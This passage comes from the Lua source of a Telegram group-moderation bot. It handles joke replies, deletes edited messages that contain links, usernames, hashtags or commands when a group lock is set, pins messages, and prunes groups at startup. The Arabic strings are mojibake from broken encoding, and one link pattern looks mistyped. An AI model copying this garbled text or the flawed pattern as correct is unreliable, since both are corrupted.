local Fun = {'Ψ§ΩΩΨ¨Ψ― ΩΨ§Ω Ψ§ΩΩ ΩΩΩ ','Ψ?ΨͺΩΩΩ ΩΨ§Ψ­Ψ¨ΩΨ§ ','Ψ?Ψ§ΩΨͺΩΩ ΩΩΩ Ψ΅Ψ―ΩΩΩ π','Ψ¨Ψ³ ΩΩ Ψ§ΩΩΩΩΨ§ Ψ§ΩΩ Ψ§ΨΉΨΆΩΨ§ π','Ψ?ΩΨ΄ Ψ¨ΩΩΩ Ψ¨Ψ³ ΨΉΨ―Ω ΩΩΨ³Ψ±Ψ§Ψͺ Ψ²Ψ§ΩΨ―Ω ΩΩΨ§ΩΨ΅Ω ΩΩΨ§ ΩΩΩΨ§ ΩΩΩΩ ΨͺΨ―Ψ±Ω Ψ¨ΩΩΨ³ΩΨ§ π','Ψ¬Ψ°Ψ§Ψ¨Ω ΩΩΩΨ§ΩΩΩ Ψ³ΩΨͺΩΩ ΩΨ΄ΩΩΩ ΩΩΩ Ψ§ΩΨ­Ψ¨ ΩΨ§ΩΨͺΩ ','Ψ¦ΩΩΩΩΩΩΩΩΩ Ψ§ΩΩΨͺ ΨΉ Ψ±Ψ¨ΩΨ§ ','Ψ―ΩΨ±Ω Ψ¨Ψ§ΩΩΩ ΩΩΩΨ§ ΨͺΩΨΉΨ¨ ΨΉ Ψ§ΩΩΩΨ― πΆ ΨΆΨ­ΩΨͺ ΨΉ ΩΨ§Ψ­Ψ― ΩΨ·ΨͺΩ Ψ§ΩΩΩΩ 7 ','Ψ΅Ψ―ΩΩΨͺΩ ΩΨ?ΨͺΩ ΩΨ±ΩΨ­Ω ΩΨ­ΩΨ§ΨͺΩ ','ΩΨ― ΩΨ­Ψ―Ω ΩΩΨ­Ψ±ΩΩ π₯','Ψ³Ψ§ΩΩΩ Ψ¨Ψ§ΩΨΉΩΨ§ΩΩ ΩΩΨͺΩ Ψ­Ψ―Ψ― Ψ¨ΨΉΨ― ΩΨ³Ψ§ΩΩΨ§ ΩΨ³Ψ§Ω Ψ―ΩΨ§ΩΩ ππ€','Ψ§Ω Ψ³Ψ­ΩΨ±Ω Ψ³Ψ­Ψ±Ψͺ Ψ§Ψ?ΩΩΨ§ ΩΨΉΩΩΨͺΩ 6 Ψ³ΩΩΨ§Ψͺ π€','ΩΨ§Ψ­Ψ¨ΩΨ§ π','Ψ¨ΩΩ ΩΨ§Ω Ψ¬ΩΨ±Ω ΨͺΨ³Ψ¦Ω ΨΉΩΩΩΨ§ Ψ ','Ψ¨Ψ±Ψ¨Ω Ψ¦ΩΨͺΩ ΩΨ§ΩΩΩ ΩΨ§Ψ±ΨΊ ΩΨ¨Ψ·Ψ±Ψ§Ω ΩΩΨ§ΨΉΨ―Ω Ψ΄Ω ΨͺΨ³ΩΩ Ψ¬Ψ§Ω ΨͺΨ³Ψ¦Ω ΨΉ Ψ¨ΩΨ§Ψͺ Ψ§ΩΨΉΨ§ΩΩ ΩΩΩ ΩΩΩ πΌ','ΩΨ§Ψ?Ω Ψ¨ΩΩΩ Ψ­Ψ¨ΩΨ¨Ω Ψ¨Ψ³ ΩΨ¨ΨΉΨ±Ω ΩΨΉΩΩ ΨΉΩΩΩΨ§ ΨͺΨ΄Ψ±Ψ¨ ΩΩΨ§Ω πΉ' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
------------------------------------------------------------------------
Tshake_Started_Bot(msg,data)
Tshake_Files(msg)
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
if msg.reply_markup_ and msg.reply_markup_.rows_ then return false end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'Tshake:message_edit'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."Tshake:Lock:edit"..msg.chat_id_) and not Text and not BasicConstructor(result) then
Reply_Status(result,result.sender_user_id_,"reply","πβΏΩΨ§Ω Ψ¨Ψ§ΩΨͺΨΉΨ―ΩΩ ΨΉΩΩ Ψ§ΩΩΩΨ―ΩΨ§")  
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
end
local text = result.content_.text_
if not Addictive(result) then
------------------------------------------------------------------------
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local Tshake_Msg = database:get(bot_id.."Tshake:Add:Filter:Rp2"..text..result.chat_id_)   
if Tshake_Msg then    
Reply_Status(result,result.sender_user_id_,"reply","πβΏ"..Tshake_Msg)  
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Tshake:Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Tshake:Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Tshake:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Tshake:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Tshake:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end
end
if (data.ID == "UpdateOption" and data.value_.value_ == "Ready") then
print('\27[30;32mΒ»Β» ΩΨ±Ψ¬Ω Ψ§ΩΨ§ΩΩΨͺΨΆΨ§Ψ± ΩΨ­ΩΩ ΨͺΩΨΈΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΩΩΩΩΩ Β«Β«\n\27[1;37m')
local list = database:smembers(bot_id..'Tshake:UsersBot')  
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = database:smembers(bot_id..'Tshake:Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
database:srem(bot_id..'Tshake:Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Tshake:Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Tshake:Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Tshake:Chek:Groups',v)   
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Tshake:Chek:Groups',v)  
end end,nil)
end;end;end
